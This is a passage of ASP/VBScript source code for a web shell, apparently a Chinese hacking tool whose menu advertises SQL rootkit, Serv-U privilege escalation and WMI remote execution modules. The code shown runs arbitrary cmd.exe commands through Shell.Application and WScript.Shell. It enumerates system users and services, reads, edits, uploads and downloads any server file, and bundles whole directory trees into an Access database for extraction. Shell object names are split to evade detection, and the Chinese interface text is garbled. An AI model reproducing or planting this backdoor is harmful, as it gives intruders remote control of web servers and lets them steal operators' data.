		echo "<li><a href='?eviloctal=MsDataBase'>΢�����ݿ�鿴/������</a></li>"
		echo "<li><a href='?eviloctal=PageAddToMdb'>�ļ��д��/�⿪��</a></li>"
		echo "<li><a href='?eviloctal=TxtSearcher'>�ı��ļ�������</a></li>"
		echo "<li><a href='?eviloctal=OtherTools'>һЩ�����С����</a></li>"
                echo "<li><a href='?ado=newado'>Ado Exploit</a></li>"
		echo "<li><a href='?sql=yes'>SqlRootKit 3.0</a></li>"
		echo "<li><a href='?eviloctal=mycom'>wmiԶ��ִ������</a></li>"
                echo "<li><a href='?su=su'>SerV-U-ASP��Ȩ</a></li>"
                echo "<li><a href='?kill=yes'>�ɵ��Ǳ���ASPľ��</a></li>"
		echo "</ol>"
		echo "BY TTFCT<hr/>"
	End Sub

	Sub PageSaCmdRun()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, thePath, theAct, appPath, appName, appArgs
		
		showTitle("She"&T&"ll.Appl"&T&"ication�����в���")
		
		theAct = Trim(Request("theAct"))
		appPath = Trim(Request("appPath"))
		thePath = Trim(Request("thePath"))
		appName = Trim(Request("appName"))
		appArgs = Trim(Request("appArgs"))

		If theAct = "doAct" Then
			If appName = "" Then
				appName = "cmd.exe"
			End If
		
			If appPath <> "" And Right(appPath, 1) <> "\" Then
				appPath = appPath & "\"
			End If
		
			If LCase(appName) = "cmd.exe" And appArgs <> "" Then
				If LCase(Left(appArgs, 2)) <> "/c" Then
					appArgs = "/c " & appArgs
				End If
			Else
				If LCase(appName) = "cmd.exe" And appArgs = "" Then
					appArgs = "/c "
				End If
			End If
			
			saX.ShellExecute appName, appArgs, appPath, "", 0
			chkErr(Err)
		End If
		
		If theAct = "readResult" Then
			Err.Clear
			echo encode(streamLoadFromFile(aspPath))
			If Err Then
				Set theFile = fsoX.OpenTextFile(aspPath)
				echo encode(theFile.ReadAll())
				Set theFile = Nothing
			End If
			Response.End
		End If
		
		echo "<style>body{margin:8;border:none;background-color:buttonface;}</style>"
		echo "<body onload=""document.forms[0].appArgs.focus();setTimeout('weviloctaloadIFrame();', 3900);"">"
		echo "<form method=post onSubmit='this.Submit.disabled=true'>"
		echo "<input type=hidden name=theAct value=doAct>"
		echo "<input type=hidden name=aspPath value=""" & HtmlEncode(aspPath) & """>"
		echo "����·��: <input name=appPath type=text id=appPath value=""" & HtmlEncode(appPath) & """ size=62><br/>"
		echo "�����ļ�: <input name=appName type=text id=appName value=""" & HtmlEncode(appName) & """ size=62> "
		echo "<input type=button name=Submit4 value=' ���� ' onClick=""this.form.appArgs.value+=' > '+this.form.aspPath.value;""><br/> "
		echo "�������: <input name=appArgs type=text id=appArgs value=""" & HtmlEncode(appArgs) & """ size=62> "
		echo "<input type=submit name=Submit value=' ���� '><br/>"
		echo "<hr/>ע: ֻ�������г�����CMD.EXE���л����²ſ��Խ�����ʱ�ļ�����(����"">""����),��������ֻ��ִ�в��ܻ���.<br/>"
		echo "��&nbsp; ��������ִ��ʱ��ͬ��ҳˢ��ʱ�䲻ͬ��,������Щִ��ʱ�䳤�ĳ�������Ҫ�ֶ�ˢ�������iframe���ܵõ�.���Ժ�ǵ�ɾ����ʱ�ļ�.<hr/>"
		echo "<iframe id=cmdResult style='width:100%;height:78%;'>"
		echo "</iframe>"
		echo "</form>"
		echo "</body>"
	End Sub

	Sub PageServiceList()
		Dim sa, objService, objComputer
		
		showTitle("ϵͳ������Ϣ�鿴")
		Set objComputer = GetObject("WinNT://.")
		Set sa = Server.CreateObject("She"&T&"ll.Appl"&T&"ication")
		objComputer.Filter = Array("Service")
		
		echo "<ol>"
		If isDebugMode = False Then
			On Error Resume Next
		End If
		For Each objService In objComputer
			echo "<li>" & objService.Name & "</li><hr/>"
			echo "<ol>��������: " & objService.Name & "<br/>"
			echo "��ʾ����: " & objService.DisplayName & "<br/>"
			echo "��������: " & getStartType(objService.StartType) & "<br/>"
			echo "����״̬: " & sa.IsServiceRunning(objService.Name) & "<br/>"
'			echo "��ǰ״̬: " & objService.Status & "<br/>"
'			echo "��������: " & objService.ServiceType & "<br/>"
			echo "��¼���: " & objService.ServiceAccountName & "<br/>"
			echo "��������: " & getServiceDsc(objService.Name) & "<br/>"
			echo "�ļ�·��������: " & objService.Path
			echo "</ol><hr/>"
		Next
		echo "</ol><hr/>"
		
		Set sa = Nothing
	End Sub
	
	Function getServiceDsc(strService)
		Dim ws
		Set ws = Server.CreateObject("WScr"&x&"ipt.Shell")
		getServiceDsc = ws.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\" & strService & "\Description")
		Set ws = Nothing
	End Function

	Sub PageTxtSearcher()
		Response.Buffer = True
		Server.ScriptTimeOut = 5000
		Dim keyword, theAct, thePath, theFolder
		theAct = Request("theAct")
		keyword = Trim(Request("keyword"))
		thePath = Trim(Request("thePath"))
		
		showTitle("�ı��ļ�������")
		
		If thePath = "" Then
			thePath = Server.MapPath("\")
		End If
		
		echo "FSO�ļ�����:"
		echo "<hr/>"
		echo "<form name=form1 method=post action=?eviloctal=TxtSearcher&theAct=fsoSearch onsubmit=this.Submit.disabled=true>"
		echo "·��: <input name=thePath type=text value=""" & HtmlEncode(thePath) & """ id=thePath size=61><br/>"
		echo "�ؼ���: <input name=keyword type=text value=""" & HtmlEncode(keyword) & """ id=keyword size=60>"
		echo "<input type=submit name=Submit value=������>"
		echo "</form>"
		echo "<hr/>"
		echo "She"&T&"ll.Appl"&T&"ication &amp; Adodb.Stream�ļ�����:"
		echo "<hr/>"
		echo "<form name=form1 method=post action=?eviloctal=TxtSearcher&theAct=saSearch onsubmit=this.Submit2.disabled=true>"
		echo "·��: <input name=thePath type=text value=""" & HtmlEncode(thePath) & """ id=thePath size=61><br/>"
		echo "�ؼ���: <input name=keyword type=text value=""" & HtmlEncode(keyword) & """ id=keyword size=60>"
		echo "<input type=submit name=Submit2 value=������>"
		echo "</form>"
		echo "<hr/>"
		
		If theAct = "fsoSearch" And keyword <> "" Then
			Set theFolder = fsoX.GetFolder(thePath)
			Call searchFolder(theFolder, keyword)
			Set theFolder = Nothing
		End If
		
		If theAct = "saSearch" And keyword <> "" Then
			Call appSearchIt(thePath, keyword)
		End If
		
		echo "<hr/>"
	End Sub
	
	Sub searchFolder(folder, str)
		Dim ext, title, theFile, theFolder
		For Each theFile In folder.Files
			ext = LCase(Split(theFile.Path, ".")(UBound(Split(theFile.Path, "."))))
			If InStr(LCase(theFile.Name), LCase(str)) > 0 Then
				echo fileLink(theFile, "")
			End If
			If ext = "asp" Or ext = "asa" Or ext = "cer" Or ext = "cdx" Then
				If searchFile(theFile, str, title, "fso") Then
					echo fileLink(theFile, title)
				End If
			End If
		Next
		Response.Flush()
		For Each theFolder In folder.subFolders
			searchFolder theFolder, str
		Next
	end sub
	
	Function searchFile(f, s, title, method)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, content, pos1, pos2
		
		If method = "fso" Then
			Set theFile = fsoX.OpenTextFile(f.Path)
			content = theFile.ReadAll()
			theFile.Close
			Set theFile = Nothing
		 Else
			content = streamLoadFromFile(f.Path)
		End If
		
		If Err Then
			Err.Clear
			content = ""
		End If
		
		searchFile = InStr(1, content, S, vbTextCompare) > 0 
		If searchFile Then
			pos1 = InStr(1, content, "<TITLE>", vbTextCompare)
			pos2 = InStr(1, content, "</TITLE>", vbTextCompare)
			title = ""
			If pos1 > 0 And pos2 > 0 Then
				title = Mid(content, pos1 + 7, pos2 - pos1 - 7)
			End If
		End If
	End Function
	
	Function fileLink(f, title)
		fileLink = f.Path
		If title = "" Then
			title = f.Name
		End If
		fileLink = "<li><font color=ff0000>" & title & "</font> " & fileLink & "</li>"
	End Function
	
	Sub appSearchIt(thePath, theKey)
		Dim title, extName, objFolder, objItem, fileName
		Set objFolder = saX.NameSpace(thePath)
		
		For Each objItem In objFolder.Items
			If objItem.IsFolder = True Then
				Call appSearchIt(objItem.Path, theKey)
				Response.Flush()
			 Else
				extName = LCase(Split(objItem.Path, ".")(UBound(Split(objItem.Path, "."))))
				fileName = Split(objItem.Path, "\")(UBound(Split(objItem.Path, "\")))
				If InStr(LCase(fileName), LCase(theKey)) > 0 Then
					echo fileLink(objItem, "")
				End If
				If extName = "asp" Or extName = "asa" Or extName = "cer" Or extName = "cdx" Then
					If searchFile(objItem, theKey, title, "application") Then
						echo fileLink(objItem, title)
					End If
				End If
			End If
		Next
	End Sub

	Sub PageUserList()
		Dim objUser, objGroup, objComputer
		
		showTitle("ϵͳ�û����û�����Ϣ�鿴")
		Set objComputer = GetObject("WinNT://.")
		objComputer.Filter = Array("User")
		echo "<a href=javascript:showHideMe(userList);>User:</a>"
		echo "<span id=userList><hr/>"
		For Each objUser in objComputer
			echo "<li>" & objUser.Name & "</li>"
			echo "<ol><hr/>"
			getUserInfo(objUser.Name)
			echo "<hr/></ol>"
		Next
		echo "</span>"
		
		echo "<br/><a href=javascript:showHideMe(userGroupList);>UserGroup:</a>"
		echo "<span id=userGroupList><hr/>"
		objComputer.Filter = Array("Group")
		For Each objGroup in objComputer
			echo "<li>" & objGroup.Name & "</li>"
			echo "<ol><hr/>" & objGroup.Description & "<hr/></ol>"
		Next
		echo "</span><hr/>"

	End Sub
	
	Sub getUserInfo(strUser)
		Dim User, Flags
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Set User = GetObject("WinNT://./" & strUser & ",user")
		echo "����: " & User.Description & "<br/>"
		echo "�����û���: " & getItsGroup(strUser) & "<br/>"
		echo "�����ѹ���: " & cbool(User.Get("PasswordExpired")) & "<br/>"
		Flags = User.Get("UserFlags")
		echo "������������: " & cbool(Flags And &H10000) & "<br/>"
		echo "�û����ܸ�������: " & cbool(Flags And &H00040) & "<br/>"
		echo "��ȫ���ʺ�: " & cbool(Flags And &H100) & "<br/>"
		echo "�������С����: " & User.PasswordMinimumLength & "<br/>"
		echo "�Ƿ�Ҫ��������: " & User.PasswordRequired & "<br/>"
		echo "�ʺ�ͣ����: " & User.AccountDisabled & "<br/>"
		echo "�ʺ�������: " & User.IsAccountLocked & "<br/>"
		echo "�û���Ϣ�ļ�: " & User.Profile & "<br/>"
		echo "�û���¼�ű�: " & User.LoginScript & "<br/>"
		echo "�û�HomeĿ¼: " & User.HomeDirectory & "<br/>"
		echo "�û�HomeĿ¼��: " & User.Get("HomeDirDrive") & "<br/>"
		echo "�ʺŹ���ʱ��: " & User.AccountExpirationDate & "<br/>"
		echo "�ʺ�ʧ�ܵ�¼����: " & User.BadLoginCount & "<br/>"
		echo "�ʺ�����¼ʱ��: " & User.LastLogin & "<br/>"
		echo "�ʺ����ע��ʱ��: " & User.LastLogoff & "<br/>"
		For Each RegTime In User.LoginHours
			If RegTime < 255 Then
				Restrict = True
			End If
		Next
		echo "�ʺ�����ʱ��: " & Restrict & "<br/>"
		Err.Clear
	End Sub
	
	Function getItsGroup(strUser)
		Dim objUser, objGroup
		Set objUser = GetObject("WinNT://./" & strUser & ",user")
		For Each objGroup in objUser.Groups
			getItsGroup = getItsGroup & " " & objGroup.Name
		Next
	End Function

	Sub PageWsCmdRun()
		Dim cmdStr, cmdPath, cmdResult
		cmdStr = Request("cm"&x&"dStr")
		cmdPath = Request("cmd"&x&"Path")
		
		showTitle("WScri"&T&"pt.She"&T&"ll�����в���")
		
		If cmdPath = "" Then
			cmdPath = "cm"&x&"d.exe"
		End If
		
		If cmdStr <> "" Then
			If InStr(LCase(cmdPath), "c"&x&"md.exe") > 0 Or InStr(LCase(cmdPath), LCase(myCmdDotExeFile)) > 0 Then
				cmdResult = doWsCmdRun(cmdPath & " /c " & cmdStr)
			 Else
		 		If LCase(cmdPath) = "wscri"&x&"ptshell" Then
					cmdResult = doWsCmdRun(cmdStr)
				 Else
					cmdResult = doWsCmdRun(cmdPath & " " & cmdStr)
				End If
			End If
		End If
		
		echo "<style>body{margin:8;}</style>"
		echo "<body onload=""document.forms[0].cmdStr.focus();document.forms[0].cmdResult.style.height=document.body.clientHeight-115;"">"
		echo "<form method=post onSubmit='this.Submit.disabled=true'>"
		echo "·��: <input name=cmdPath type=text id=cmdPath value=""" & HtmlEncode(cmdPath) & """ size=50> "
		echo "<input type=button name=Submit2 value=ʹ��WScri"&T&"pt.She"&T&"ll onClick=""this.form.cmdPath.value='WScriptShell';""><br/>"
		echo "����/����: <input name=cmdStr type=text id=cmdStr value=""" & HtmlEncode(cmdStr) & """ size=62> "
		echo "<input type=submit name=Submit value=' ���� '><br/>"
		echo "<hr/>ע: ��ֻ������ִ�е�������(����ִ�п�ʼ����������Ҫ�˹���Ԥ),��Ȼ��������޷���������,�����ڷ���������һ�����ɽ����Ľ���.<hr/>"
		echo "<textarea id=cmdResult style='width:100%;height:78%;'>"
		echo HtmlEncode(cmdResult)
		echo "</textarea>"
		echo "</form>"
		echo "</body>"
	End Sub
	
	Function doWsCmdRun(cmdStr)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim fso, theFile
		Set fso = Server.CreateObject("Scripting.FileSystemObject")
		
		doWsCmdRun = wsX.Exec(cmdStr).StdOut.ReadAll()
		If Err Then
			echo Err.Description & "<br>"
			Err.Clear
			wsX.Run cmdStr & " > " & aspPath, 0, True
			Set theFile = fso.OpenTextFile(aspPath)
			doWsCmdRun = theFile.RealAll()
			If Err Then
				echo Err.Description & "<br>"
				Err.Clear
				doWsCmdRun = streamLoadFromFile(aspPath)
			End If
		End If
		
		Set fso = Nothing
	End Function
	Sub PageOther()
		echo "<style>"
		echo "A:visited {color: #333333;text-decoration: none;}"
		echo "A:active {color: #333333;text-decoration: none;}"
		echo "A:link {color: #000000;text-decoration: none;}"
		echo "A:hover {color: #333333;text-decoration: none;}"
		echo "BODY {font-size: 9pt;COLOR: #000000;font-family: ""Courier New"";border: none;background-color: buttonface;}"
		echo "textarea {font-family: ""Courier New"";font-size: 12px;border-width: 1px;color: #000000;}"
		echo "table {font-size: 9pt;}"
		echo "form {margin: 0;}"
		echo "#fsoDriveList span{width: 100px;}"
		echo "#FileList span{width: 90;height: 70;cursor: hand;text-align: center;word-break: break-all;border: 1px solid buttonface;}"
		echo ".anotherSpan{color: #ffffff;width: 90;height: 70;text-align: center;background-color: #0A246A;border: 1px solid #0A246A;}"
		echo ".font{font-size: 35px;line-height: 40px;}"
		echo "#fileExplorerTools {background-color: buttonFace;}"
		echo ".input, input {border-width: 1px;}"
		echo "</style>" & vbNewLine
		
		echo "<script language=javascript>" & vbNewLine
		echo "function showHideMe(me){" & vbNewLine
		echo "if(me.innerText == ''){" & vbNewLine
		echo "me.innerText = '\nNo Contents!';" & vbNewLine
		echo "}" & vbNewLine
		echo "if(me.style.display == 'none'){" & vbNewLine
		echo "me.style.display = '';" & vbNewLine
		echo "}else{" & vbNewLine
		echo "me.style.display = 'none';" & vbNewLine
		echo "}" & vbNewLine
		echo "}" & vbNewLine
		echo "function changeMyClass(me){" & vbNewLine
		echo "if(me.className == ''){" & vbNewLine
		echo "if(usePath.value != '')document.getElementById(usePath.value).className = '';" & vbNewLine
		echo "usePath.value = me.id;" & vbNewLine
		echo "status = me.title;" & vbNewLine
		echo "me.className = 'anotherSpan';" & vbNewLine
		echo "}" & vbNewLine
		echo "}" & vbNewLine
		echo "function changeThePath(me){" & vbNewLine
		echo "location.href = '?eviloctal=' + eviloctal.value + '&thePath=' + me.id;" & vbNewLine
		echo "}" & vbNewLine
		echo "function fixTheLayer(strObj){" & vbNewLine
		echo "var objStyle=document.getElementById(strObj).style;" & vbNewLine
		echo "objStyle.width = document.body.clientWidth;" & vbNewLine
		echo "objStyle.top = document.body.scrollTop + 2;" & vbNewLine
		echo "}" & vbNewLine
		echo "function openUrl(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=openUrl&thePath=' + usePath.value);" & vbNewLine
		echo "}" & vbNewLine
		echo "function newOne(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=newOne&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=110,width=300');" & vbNewLine
		echo "}" & vbNewLine
		echo "function editFile(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=showEdit&thePath=' + usePath.value, '', 'menu=no,resizable=yes');" & vbNewLine
		echo "}" & vbNewLine
		echo "function appDoAction(act){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=' + act + '&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function downTheFile(){" & vbNewLine
		echo "if(confirm('������ļ�����20M,\n���鲻Ҫͨ������ʽ����\n������ռ�÷�������������Դ\n�����ܵ��·���������!\n�������Ȱ��ļ����Ƶ���ǰվ��Ŀ¼��,\nȻ��ͨ��httpЭ��������.\n��\""ȷ��\""��������������.')){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=downTheFile&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "}" & vbNewLine
		echo "function appDoAction2(act){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=' + act + '&thePath=' + truePath.value, '','menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function appTheAttributes(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=theAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=194,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function appRename(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=rename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function upTheFile(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=showUpload&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=80,width=380');" & vbNewLine
		echo "}" & vbNewLine
		echo "function weviloctaloadIFrame(){" & vbNewLine
		echo "cmdResult.location.href = '?eviloctal=SaCmdRun&theAct=readResult';" & vbNewLine
		echo "}" & vbNewLine
		echo "function fsoRename(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=showFsoRename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=20,width=300');" & vbNewLine
		echo "}" & vbNewLine
		echo "function delOne(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=delOne&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function fsoGetAttributes(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=getAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=170,width=300');" & vbNewLine
		echo "}" & vbNewLine
		echo "</script>"
	End Sub

	Sub openUrl(usePath)
		Dim theUrl, thePath
		
		thePath = Server.MapPath("/")
		
		If LCase(Left(usePath, Len(thePath))) = LCase(thePath) Then
			theUrl = Mid(usePath, Len(thePath) + 1)
			theUrl = Replace(theUrl, "\", "/")
			If Left(theUrl, 1) = "/" Then
				theUrl = Mid(theUrl, 2)
			End If
			Response.Redirect("/" & theUrl)
		 Else
			alertThenClose("����Ҫ�򿪵��ļ����ڱ�վ��Ŀ¼��\n�����Գ��԰�Ҫ��(����)���ļ�ճ����\nվ��Ŀ¼��,Ȼ���ٴ�(����)!")
			Response.End
		End If
	End Sub
	
	Sub showEdit(thePath, strMethod)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, unEditableExt
		
		If Right(thePath, 1) = "\" Then
			alertThenClose("�༭�ļ��в����ǷǷ���.")
			Response.End
		End If
		
		unEditableExt = "$exe$dll$bmp$wav$mp3$wma$ra$wmv$ram$rm$avi$mgp$png$tiff$gif$pcx$jpg$com$msi$scr$rar$zip$ocx$sys$mdb$"
		
		echo "<style>body{border:none;overflow:hidden;background-color:buttonface;}</style>"
		echo "<body topmargin=9>"
		echo "<form method=post style='margin:0;width:100%;height:100%;'>"
		echo "<textarea name=fileContent style='width:100%;height:90%;'>"
		If strMethod = "stream" Then
			echo HtmlEncode(streamLoadFromFile(thePath))
		 Else
			Set theFile = fsoX.OpenTextFile(thePath, 1)
			echo HtmlEncode(theFile.ReadAll())
			theFile.Close
			Set theFile = Nothing
		End If
		echo "</textarea><hr/>"
		echo "<div align=right>"
		echo "����Ϊ:<input size=30 name=thePath value=""" & HtmlEncode(thePath) & """> "
		echo "<input type=checkbox name='windowStatus' id=windowStatus"
		If Request.Cookies(m & "windowStatus") = "True" Then
			echo " checked"
		End If
		echo "><label for=windowStatus>�����رմ���</label> "
		echo "<input type=submit value=' ���� '><input type=hidden value='saveFile' name=theAct>"
		echo "<input type=reset value=' �ָ� '>"
		echo "<input type=button value=' ��� ' onclick=this.form.fileContent.innerText='';>"
		echo strJsCloseMe & "</div>"
		echo "</form>"
		echo "</body><br/>"
		
	End Sub
	
	Sub saveToFile(thePath, strMethod)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim fileContent, windowStatus
		fileContent = Request("fileContent")
		windowStatus = Request("windowStatus")
		
		If strMethod = "stream" Then
			streamSaveToFile thePath, fileContent
			chkErr(Err)
		 Else
			fsoSaveToFile thePath, fileContent
			chkErr(Err)
		End If
		
		If windowStatus = "on" Then
			Response.Cookies(m & "windowStatus") = "True"
			Response.Write "<script>window.close();</script>"
		 Else
			Response.Cookies(m & "windowStatus") = "False"
			Call showEdit(thePath, strMethod)
		End If
	End Sub
	
	Sub fsoSaveToFile(thePath, fileContent)
		Dim theFile
		Set theFile = fsoX.OpenTextFile(thePath, 2, True)
		theFile.Write fileContent
		theFile.Close
		Set theFile = Nothing
	End Sub
	
	Function streamLoadFromFile(thePath)
		Dim stream
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Set stream = Server.CreateObject("adodb.stream")
		With stream
			.Type=2
			.Mode=3
			.Open
			.LoadFromFile thePath
			.LoadFromFile thePath
			If Request("eviloctal") <> "TxtSearcher" Then
				chkErr(Err)
			End If
			.Charset="gb2312"
			.Position=2
			streamLoadFromFile=.ReadText()
			.Close
		End With
		Set stream = Nothing
	End Function
	
	Sub downTheFile(thePath)
		Response.Clear
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim stream, fileName, fileContentType

		fileName = split(thePath,"\")(uBound(split(thePath,"\")))
		Set stream = Server.CreateObject("adodb.stream")
		stream.Open
		stream.Type = 1
		stream.LoadFromFile(thePath)
		chkErr(Err)
		Response.AddHeader "Content-Disposition", "attachment; filename=" & fileName
		Response.AddHeader "Content-Length", stream.Size
		Response.Charset = "UTF-8"
		Response.ContentType = "application/octet-stream"
		Response.BinaryWrite stream.Read 
		Response.Flush
		stream.Close
		Set stream = Nothing
	End Sub
	
	Sub showUpload(thePath, eviloctal)
		echo "<style>body{margin:8;overflow:hidden;}</style>"
		echo "<form method=post enctype='multipart/form-data' action='?eviloctal=" & eviloctal & "&theAct=upload&thePath=" & UrlEncode(thePath) & "' onsubmit='this.Submit.disabled=true;;'>"
		echo "�ϴ��ļ�: <input name=file type=file size=31><br/>����Ϊ: "
		echo "<input name=fileName type=text value=""" & HtmlEncode(thePath) & """ size=33>"
		echo "<input type=checkbox name=writeMode value=True>����ģʽ<hr/>"
		echo "<input name=Submit type=submit id=Submit value='�� ��' onClick=""this.form.action+='&fileName='+this.form.fileName.value+'&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;"">"
		echo  strJsCloseMe
		echo "</form>"
	End Sub
	
	Sub streamUpload(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Server.ScriptTimeOut = 5000
		Dim i, j, info, stream, streamT, theFile, fileName, overWrite, fileContent
		theFile = Request("theFile")
		fileName = Request("fileName")
		overWrite = Request("overWrite")

		If InStr(fileName, ":") <= 0 Then
			fileName = thePath & fileName
		End If

		Set stream = Server.CreateObject("adodb.stream")
		Set streamT = Server.CreateObject("adodb.stream")

		With stream
			.Type = 1
			.Mode = 3
			.Open
			.Write Request.BinaryRead(Request.TotalBytes)
			.Position = 0
			fileContent = .Read()
			i = InStrB(fileContent, chrB(13) & chrB(10))
			info = LeftB(fileContent, i - 1)
			i = Len(info) + 2
			i = InStrB(i, fileContent, chrB(13) & chrB(10) & chrB(13) & chrB(10)) + 4 - 1
			j = InStrB(i, fileContent, info) - 1
			streamT.Type = 1
			streamT.Mode = 3
			streamT.Open
			stream.position = i
			.CopyTo streamT, j - i - 2
			If overWrite = "true" Then
				streamT.SaveToFile fileName, 2
			 Else
				streamT.SaveToFile fileName
			End If
			If Err.Number = 3004 Then
				Err.Clear
				fileName = fileName & "\" & Split(theFile, "\")(UBound(Split(theFile ,"\")))
				If overWrite="true" Then
					streamT.SaveToFile fileName, 2
				 Else
					streamT.SaveToFile fileName
				End If
			End If
			chkErr(Err)
			echo("<script language=""javascript"">alert('�ļ��ϴ��ɹ�!\n" & Replace(fileName, "\", "\\") & "');</script>")
			streamT.Close
			.Close
		End With
		
		Set stream = Nothing
		Set streamT = Nothing
	End Sub

	Function getDriveType(num)
		Select Case num
			Case 0
				getDriveType = "δ֪"
			Case 1
				getDriveType = "���ƶ�����"
			Case 2
				getDriveType = "����Ӳ��"
			Case 3
				getDriveType = "�������"
			Case 4
				getDriveType = "CD-ROM"
			Case 5
				getDriveType = "RAM ����"
		End Select
	End Function

	Function getFileIcon(extName)
		Select Case LCase(extName)
			Case "vbs", "h", "c", "cfg", "pas", "bas", "log", "asp", "txt", "php", "ini", "inc", "htm", "html", "xml", "conf", "config", "jsp", "java", "htt", "lst", "aspx", "php3", "php4", "js", "css", "asa"
				getFileIcon = "Wingdings>2"
			Case "wav", "mp3", "wma", "ra", "wmv", "ram", "rm", "avi", "mpg"
				getFileIcon = "Webdings>��"
			Case "jpg", "bmp", "png", "tiff", "gif", "pcx", "tif"
				getFileIcon = "'webdings'>&#159;"
			Case "exe", "com", "bat", "cmd", "scr", "msi"
				getFileIcon = "Webdings>1"
			Case "sys", "dll", "ocx"
				getFileIcon = "Wingdings>&#255;"
			Case Else
				getFileIcon = "'Wingdings 2'>/"
		End Select
	End Function

	Function getStartType(num)
		Select Case num
			Case 2
				getStartType = "�Զ�"
			Case 3
				getStartType = "�ֶ�"
			Case 4
				getStartType = "�ѽ���"
		End Select
	End Function

	Sub PageAddToMdb()
		Dim theAct, thePath
		theAct = Request("theAct")
		thePath = Request("thePath")
		Server.ScriptTimeOut = 5000

		showTitle("�ļ��д��/�⿪��")

		If theAct = "addToMdb" Then
			addToMdb(thePath)
			alertThenClose("�������!")
			Response.End
		End If
		If theAct = "releaseFromMdb" Then
			unPack(thePath)
			alertThenClose("�������!")
			Response.End
		End If

		echo "�ļ��д��:<br/>"
		echo "<form method=post target=_blank>"
		echo "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
		echo "<input type=hidden value=addToMdb name=theAct>"
		echo "<select name=theMethod><option value=fso>FSO</option><option value=app>��FSO</option>"
		echo "</select>"
		echo "<br><input type=submit value='��ʼ���'>"
		echo "<hr/>ע: �������eviloctalTop.mdb�ļ�,λ��ͬ��Ŀ¼��"
		echo "</form>"

		echo "<hr/>�ļ����⿪(��FSO֧��):<br/>"
		echo "<form method=post target=_blank>"
		echo "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\eviloctalTop.mdb"" size=80>"
		echo "<input type=hidden value=releaseFromMdb name=theAct><input type=submit value='���ҽ⿪'>"
		echo "<hr/>ע: �⿪���������ļ���λ��ͬ��Ŀ¼��"
		echo "</form>"


		echo "<hr/>"
	End Sub

	Sub addToMdb(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim rs, conn, stream, connStr, adoCatalog
		Set rs = Server.CreateObject("ADODB.RecordSet")
		Set stream = Server.CreateObject("ADODB.Stream")
		Set conn = Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction")
		Set adoCatalog = Server.CreateObject("ADOX.Catalog")
		connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("eviloctalTop.mdb")

		adoCatalog.Create connStr
		conn.Open connStr
		conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
		
		stream.Open
		stream.Type = 1
		rs.Open "FileData", conn, 3, 3
		
		If Request("theMethod") = "fso" Then
			fsoTreeForMdb thePath, rs, stream
		 Else
			saTreeForMdb thePath, rs, stream
		End If

		rs.Close
		Conn.Close
		stream.Close
		Set rs = Nothing
		Set conn = Nothing
		Set stream = Nothing
		Set adoCatalog = Nothing
	End Sub

	Function fsoTreeForMdb(thePath, rs, stream)
		Dim item, theFolder, folders, files, sysFileList
		sysFileList = "$eviloctalTop.mdb$eviloctalTop.ldb$"
		If fsoX.FolderExists(thePath) = False Then
			showErr(thePath & " Ŀ¼�����ڻ��߲��������!")
		End If
		Set theFolder = fsoX.GetFolder(thePath)
		Set files = theFolder.Files
		Set folders = theFolder.SubFolders

		For Each item In folders
			fsoTreeForMdb item.Path, rs, stream
		Next

		For Each item In files
			If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
				rs.AddNew
				rs("thePath") = Mid(item.Path, 4)
				stream.LoadFromFile(item.Path)
				rs("fileContent") = stream.Read()
				rs.Update
			End If
		Next

		Set files = Nothing
		Set folders = Nothing
		Set theFolder = Nothing
	End Function

	Sub unPack(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Server.ScriptTimeOut = 5000
		Dim rs, ws, str, conn, stream, connStr, theFolder
		str = Server.MapPath(".") & "\"
